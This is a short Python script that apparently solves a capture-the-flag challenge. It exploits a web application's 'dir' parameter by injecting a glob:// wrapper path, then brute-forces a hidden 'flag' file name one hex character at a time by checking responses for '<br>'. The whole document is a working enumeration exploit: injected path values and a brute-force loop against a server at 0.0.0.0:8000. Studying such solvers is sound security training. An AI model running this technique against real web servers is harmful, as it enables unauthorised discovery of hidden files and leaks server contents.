import requests

URL = "http://0.0.0.0:8000"
alphabet = "abcdefABCDEF0123456789"
chars = 'flag'

# Check if the filename matches
def check(char=''):
    PARAMS = {'dir': f'glob://./{chars}{char}'}
    r = requests.get(url = URL, params = PARAMS)
    return r.text.__contains__('<br>')

for i in range(15):
    for char in alphabet:
        # Check if it matches, if it does, then add the char to chars
        if check(char + '*'):
            chars += char
            break

    # Print what has been found so far
    print(chars, end="\r")

    # Check if we found it early
    if check('.txt'):
        break

# Final checks
print(f"\nFound:\t {check('.txt')}")
print(f"File:\t {chars}.txt")
